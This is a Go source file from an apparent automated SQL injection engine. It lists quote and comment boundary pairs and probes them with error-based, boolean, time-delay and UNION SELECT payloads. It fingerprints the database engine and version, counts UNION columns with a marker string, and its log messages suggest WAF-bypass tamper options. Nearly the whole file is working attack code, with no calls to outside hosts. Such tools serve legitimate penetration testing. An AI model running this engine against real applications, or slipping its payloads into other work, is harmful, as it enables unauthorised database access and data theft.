package core

import (
	"fmt"
	"strings"
	"sync/atomic"
	"time"
)

// BoundaryCandidate is a prefix/suffix pair that may close the original SQL
// context and comment out the remainder of the query.
type BoundaryCandidate struct {
	Prefix string
	Suffix string
}

// BoundaryCandidates returns the common contexts used by real applications.
// The order matters: string contexts are more common than numeric ones.
func BoundaryCandidates() []BoundaryCandidate {
	return []BoundaryCandidate{
		{"'", "-- -"},
		{"'", "-- "},
		{"'", "#"},
		{"'", "/*"},
		{"'", ";"},
		{"\"", "-- -"},
		{"\"", "#"},
		{"\")", "-- -"},
		{"'))", "-- -"},
		{"')", "-- -"},
		{"')", "#"},
		{"\")", "#"},
		{")", "-- -"},
		{"))", "-- -"},
		{"", "-- -"},
		{"", "#"},
		{"", ""},
	}
}

// quickBoundaryCandidates are the contexts that cover almost every real
// application. The longer list is only tried when none of these work.
func quickBoundaryCandidates() []BoundaryCandidate {
	return []BoundaryCandidate{
		{"'", "-- -"},
		{"'", "#"},
		{"'", "-- "},
		{"\"", "-- -"},
		{"", ""},
		{")", "-- -"},
		{"')", "-- -"},
		{"'))", "-- -"},
	}
}

// boundaryDialects limits fingerprint probes to engines that are plausible for
// the target. Probing every dialect for every candidate is what made a scan
// look hung.
func (e *Engine) boundaryDialects() []*Dialect {
	if d := GetDialect(e.Opts.DBMS); d != nil {
		return []*Dialect{d}
	}
	var out []*Dialect
	seen := map[string]bool{}
	add := func(name string) {
		d := GetDialect(name)
		if d == nil || seen[d.Name] {
			return
		}
		seen[d.Name] = true
		out = append(out, d)
	}
	body := e.BaselineBody
	if body == "" {
		body = e.LastResponseBody
	}
	if hint := DetectDBMS(body, e.LastResponseHeaders); hint != "Unknown" && hint != "" {
		add(hint)
	}
	for _, name := range []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite", "Oracle"} {
		add(name)
	}
	return out
}

// probe sends one boundary payload. Blocked responses are counted so the
// caller can stop when the WAF rejects everything.
func (e *Engine) probe(point InjectionPoint, c BoundaryCandidate, fragment string) (string, int, error) {
	body, length, _, err := e.RequestAt(point, c.Prefix+fragment+c.Suffix)
	return body, length, err
}

// DetectBoundary finds a working prefix/suffix pair and the first technique
// that proves the injection. It is ordered cheapest-first and stops as soon as
// a proof lands.
func (e *Engine) DetectBoundary(point InjectionPoint, baseBody string) (Boundary, string, string, bool) {
	forced := e.Opts.Prefix != "" || e.Opts.Suffix != ""
	techniques := []string{"error", "boolean", "time", "union"}
	switch strings.ToLower(strings.TrimSpace(e.Opts.Technique)) {
	case "", "auto":
		// Keep the default order.
	case "blind":
		techniques = []string{"boolean"}
	case "boolean", "time", "error", "union":
		techniques = []string{strings.ToLower(e.Opts.Technique)}
	case "stacked":
		techniques = []string{"union"}
	}

	if forced {
		c := BoundaryCandidate{Prefix: e.Opts.Prefix, Suffix: e.Opts.Suffix}
		for _, technique := range techniques {
			if ok, proof := e.probeBoundary(point, c, technique, baseBody); ok {
				return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, technique, proof, true
			}
		}
		return Boundary{}, "", "", false
	}

	tried := map[string]bool{}
	run := func(candidates []BoundaryCandidate) (Boundary, string, string, bool) {
		for _, technique := range techniques {
			for _, c := range candidates {
				key := c.Prefix + "\x00" + c.Suffix
				if tried[key] {
					continue
				}
				tried[key] = true
				if e.expired() {
					e.outOfTime("boundary detection")
					return Boundary{}, "", "", false
				}
				if atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
					e.Log.Warning("the target keeps rejecting SQL payloads; stopping boundary detection")
					e.Log.Warning("retry with --bypass-waf, --tamper space2comment, or a manual --prefix/--suffix")
					return Boundary{}, "", "", false
				}
				e.Log.Info(fmt.Sprintf("probing %s boundary %q / %q", technique, c.Prefix, c.Suffix))
				if ok, proof := e.probeBoundary(point, c, technique, baseBody); ok {
					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, technique, proof, true
				}
			}
		}
		return Boundary{}, "", "", false
	}

	if boundary, technique, proof, ok := run(quickBoundaryCandidates()); ok {
		return boundary, technique, proof, true
	}
	if e.expired() {
		return Boundary{}, "", "", false
	}
	return run(BoundaryCandidates())
}

const blockedAbortThreshold = 15

// probeBoundary tests one candidate with one technique.
func (e *Engine) probeBoundary(point InjectionPoint, c BoundaryCandidate, technique, baseBody string) (bool, string) {
	switch technique {
	case "error":
		for _, d := range e.boundaryDialects() {
			expr, ok := d.ErrorExpr("1")
			if !ok {
				continue
			}
			fragment := " AND " + expr
			body, _, err := e.probe(point, c, fragment)
			if err != nil {
				continue
			}
			if e.Opts.Verbose >= 3 {
				e.Log.Info(fmt.Sprintf("error probe %s: status=%d len=%d match=%v", d.Name, e.LastStatusCode, len(body), hasDBMSError(body, d.Name)))
			}
			if hasDBMSError(body, d.Name) || strings.Contains(body, "~1~") {
				return true, c.Prefix + fragment + c.Suffix
			}
		}
	case "boolean":
		forms := [][2]string{
			{" AND '1'='1", " AND '1'='2"},
			{" AND 1=1", " AND 1=2"},
			{" AND 1 LIKE 1", " AND 1 LIKE 2"},
			{" AND 2>1", " AND 1>2"},
		}
		for _, form := range forms {
			if ok, proof := e.testBoundaryBoolean(point, c, form[0], form[1], baseBody); ok {
				return true, proof
			}
			if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
				return false, ""
			}
		}
	case "time":
		return e.testBoundaryTime(point, c)
	case "union":
		return e.testBoundaryUnion(point, c, baseBody)
	}
	return false, ""
}

// boolProbe sends one boolean payload. A blocked response means the form is
// unusable, so the caller skips it instead of spending requests on the pair.
func (e *Engine) boolProbe(point InjectionPoint, c BoundaryCandidate, fragment string) (string, bool) {
	for attempt := 0; attempt < 2; attempt++ {
		body, length, err := e.probe(point, c, fragment)
		if err == nil {
			if looksBlocked(e.LastStatusCode, length) {
				return "", false
			}
			return body, true
		}
		time.Sleep(300 * time.Millisecond)
	}
	return "", false
}

func (e *Engine) testBoundaryBoolean(point InjectionPoint, c BoundaryCandidate, trueFrag, falseFrag, baseBody string) (bool, string) {
	e.Log.Debug(fmt.Sprintf("boolean probe %q %q", c.Prefix, strings.TrimSpace(trueFrag)))
	true1, ok := e.boolProbe(point, c, trueFrag)
	if !ok {
		return false, ""
	}
	false1, ok := e.boolProbe(point, c, falseFrag)
	if !ok {
		return false, ""
	}
	if !booleanDiffer(true1, false1) {
		return false, ""
	}
	// Confirm both branches are stable before trusting the difference.
	true2, ok := e.boolProbe(point, c, trueFrag)
	if !ok || !responsesSimilar(true1, true2) {
		return false, ""
	}
	false2, ok := e.boolProbe(point, c, falseFrag)
	if !ok || !responsesSimilar(false1, false2) {
		return false, ""
	}
	if similarity(true1, baseBody) < 0.35 && similarity(false1, baseBody) < 0.35 {
		return false, ""
	}
	return true, c.Prefix + trueFrag + c.Suffix
}

func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) (bool, string) {
	baseline := e.baselineLatency(point)
	delay := e.Opts.TimeSecs
	if delay <= 0 {
		delay = 3
	}
	if delay > 3 {
		delay = 3
	}
	dialects := e.boundaryDialects()
	if len(dialects) > 4 {
		dialects = dialects[:4]
	}
	for _, d := range dialects {
		if e.expired() {
			return false, ""
		}
		fragment := " AND " + d.TimeCondition("1=1", delay)
		_, _, err := e.probe(point, c, fragment)
		if err != nil || e.LastResponseTime <= baseline+delayThreshold(delay) {
			continue
		}
		// One slow sample can be network noise. Confirm it before declaring
		// the target time injectable.
		_, _, err = e.probe(point, c, fragment)
		if err == nil && e.LastResponseTime > baseline+delayThreshold(delay) {
			return true, c.Prefix + fragment + c.Suffix
		}
	}
	return false, ""
}

func (e *Engine) testBoundaryError(point InjectionPoint, c BoundaryCandidate) (bool, string) {
	for _, d := range e.boundaryDialects() {
		expr, ok := d.ErrorExpr("1")
		if !ok {
			continue
		}
		fragment := " AND " + expr
		body, _, err := e.probe(point, c, fragment)
		if err != nil {
			continue
		}
		if isErrorLike(body, d.Name) || strings.Contains(body, "~1~") {
			return true, c.Prefix + fragment + c.Suffix
		}
	}
	return false, ""
}

func (e *Engine) testBoundaryUnion(point InjectionPoint, c BoundaryCandidate, baseBody string) (bool, string) {
	for cols := 1; cols <= 8; cols++ {
		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		for _, prefix := range []string{" UNION SELECT ", " UNION ALL SELECT "} {
			fragment := prefix + strings.Join(nulls, ",")
			body, length, err := e.probe(point, c, fragment)
			if err != nil {
				continue
			}
			if !isErrorLike(body, "") && length > 0 && responsesDiffer(body, baseBody) {
				return true, c.Prefix + fragment + c.Suffix
			}
		}
	}
	return false, ""
}

func (e *Engine) baselineLatency(point InjectionPoint) time.Duration {
	var samples []time.Duration
	for i := 0; i < 3; i++ {
		_, _, _, err := e.RequestAt(point, "")
		if err != nil {
			continue
		}
		samples = append(samples, e.LastResponseTime)
		time.Sleep(100 * time.Millisecond)
	}
	if len(samples) == 0 {
		return 0
	}
	return medianDuration(samples)
}

func medianDuration(values []time.Duration) time.Duration {
	if len(values) == 0 {
		return 0
	}
	sorted := make([]time.Duration, len(values))
	copy(sorted, values)
	for i := 1; i < len(sorted); i++ {
		for j := i; j > 0 && sorted[j] < sorted[j-1]; j-- {
			sorted[j], sorted[j-1] = sorted[j-1], sorted[j]
		}
	}
	return sorted[len(sorted)/2]
}

// IdentifyDBMS uses version expressions from each dialect until one returns a
// plausible version string. It requires a working boundary and technique.
func (e *Engine) IdentifyDBMS(session *Session) {
	if session == nil {
		return
	}
	if d := GetDialect(session.DBMS); d != nil && session.DBMS != "" && !strings.EqualFold(session.DBMS, "Unknown") {
		// The DBMS was forced by the operator. Keep the canonical dialect
		// name and still try to read the version through the confirmed
		// technique without fingerprinting every other dialect.
		session.DBMS = d.Name
		e.identifyVersion(session, d)
		return
	}

	// Column detection is dialect independent, so do it once before trying
	// each version expression. This keeps identification fast.
	if session.Columns <= 0 {
		// UNION probing is expensive and a target that blocks SQL will reject
		// every column count. Skip it once the filter is clearly active.
		if strings.EqualFold(session.Technique, "union") || atomic.LoadInt64(&e.blocked) < 5 {
			if cols, col, ok := e.DetectUnionColumns(session); ok {
				session.Columns = cols
				session.StringCol = col
			}
		}
	}

	for _, d := range e.boundaryDialects() {
		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
			e.Log.Warning("stopping DBMS identification early; the target filters SQL payloads")
			return
		}
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "union"
		probeExec := NewExecutor(e, &probe)
		if probe.Columns > 0 && probe.StringCol >= 0 {
			if value, err := probeExec.unionScalar(d.Version()); err == nil && looksLikeVersion(value) {
				session.DBMS = d.Name
				session.DBMSVersion = value
				return
			}
		}
		if expr, ok := d.ErrorExpr(d.Version()); ok {
			body, _, err := probeExec.Request(" AND " + expr)
			if err == nil {
				if value := extractMarker(body); looksLikeVersion(value) {
					session.DBMS = d.Name
					session.DBMSVersion = value
					return
				}
			}
		}
	}

	// When neither UNION nor error output is available, use the confirmed
	// boolean oracle to test a dialect-specific expression. This is a
	// fingerprint, not a full extraction, so it stays cheap.
	if strings.EqualFold(session.Technique, "time") && e.identifyDBMSTime(session) {
		return
	}
	if e.identifyDBMSBlind(session) {
		return
	}
	// A target that only answers through response timing needs a timing
	// fingerprint instead of a boolean one.
	e.identifyDBMSTime(session)
}

// identifyVersion reads the version string for a known dialect. It uses
// in-band output when available and leaves the version empty when the target
// only supports blind extraction, because blind version extraction is
// expensive and does not change the rest of the assessment.
func (e *Engine) identifyVersion(session *Session, d *Dialect) {
	if session.DBMSVersion != "" {
		return
	}
	probe := *session
	probe.DBMS = d.Name
	probe.Technique = "union"
	exec := NewExecutor(e, &probe)
	// unionScalar detects the column count lazily. This lets version
	// extraction work even when the confirmed technique was boolean or
	// time based, as long as the target also accepts UNION output.
	if value, err := exec.unionScalar(d.Version()); err == nil && looksLikeVersion(value) {
		session.Columns = probe.Columns
		session.StringCol = probe.StringCol
		session.DBMSVersion = value
		return
	}
	if expr, ok := d.ErrorExpr(d.Version()); ok {
		body, _, err := exec.Request(" AND " + expr)
		if err == nil {
			if value := extractMarker(body); looksLikeVersion(value) {
				session.DBMSVersion = value
				return
			}
		}
	}
}

// identifyDBMSTime finds the dialect whose delay primitive actually works. It
// is used when the target suppresses all boolean and in-band differences.
func (e *Engine) identifyDBMSTime(session *Session) bool {
	for _, d := range e.boundaryDialects() {
		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
			return false
		}
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "time"
		exec := NewExecutor(e, &probe)
		if exec.timeOracle("1=1") {
			session.DBMS = d.Name
			return true
		}
	}
	return false
}

func (e *Engine) identifyDBMSBlind(session *Session) bool {
	for _, d := range e.boundaryDialects() {
		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
			return false
		}
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "boolean"
		exec := NewExecutor(e, &probe)
		condition := fmt.Sprintf("%s > 0", d.Length(d.Version()))
		if exec.booleanOracle(condition) {
			session.DBMS = d.Name
			return true
		}
	}
	return false
}

func looksLikeVersion(value string) bool {
	lower := strings.ToLower(value)
	if len(value) < 3 || len(value) > 200 {
		return false
	}
	if strings.Contains(lower, "syntax") || strings.Contains(lower, "error") {
		return false
	}
	digits := 0
	for _, r := range value {
		if r >= '0' && r <= '9' {
			digits++
		}
	}
	return digits >= 2
}

// DetectUnionColumns determines the number of columns and the first
// string-compatible column. The probe inserts a marker instead of trusting
// error text: the column count is only accepted when the marker comes back.
func (e *Engine) DetectUnionColumns(session *Session) (int, int, bool) {
	if session == nil {
		return 0, 0, false
	}
	exec := NewExecutor(e, session)
	d := exec.Dialect
	marker := d.Marker("'HACKIT'")

	for n := 1; n <= 25; n++ {
		for col := 0; col < n; col++ {
			nulls := make([]string, n)
			for i := range nulls {
				nulls[i] = "NULL"
			}
			nulls[col] = marker
			fragment := " UNION SELECT " + strings.Join(nulls, ",")
			body, _, err := exec.Request(fragment)
			if err != nil {
				continue
			}
			if strings.Contains(body, "~HACKIT~") {
				return n, col, true
			}
		}
	}
	return 0, 0, false
}
